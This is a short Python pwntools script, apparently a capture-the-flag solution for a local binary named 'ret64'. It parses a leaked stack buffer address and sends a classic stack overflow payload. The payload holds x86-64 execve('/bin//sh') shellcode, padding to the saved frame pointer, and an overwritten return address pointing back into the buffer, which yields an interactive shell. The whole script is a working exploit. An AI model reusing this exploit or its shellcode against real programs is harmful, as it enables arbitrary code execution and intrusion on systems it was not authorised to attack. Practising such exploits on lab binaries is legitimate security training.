from pwn import *

context.log_level = "DEBUG"
p = process("./ret64")

p.recvuntil(b"buf : ")
buf = p.recv(14)
buf = buf[3:]

buf_addr = p64(int(buf,16))

shell = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05" 
payload = shell + b'\x12'*(0xD0-len(shell)) + b'\x13'*0x8 + buf_addr

p.recv()
#p.recvuntil(b'your input :')
p.send(payload)

p.interactive()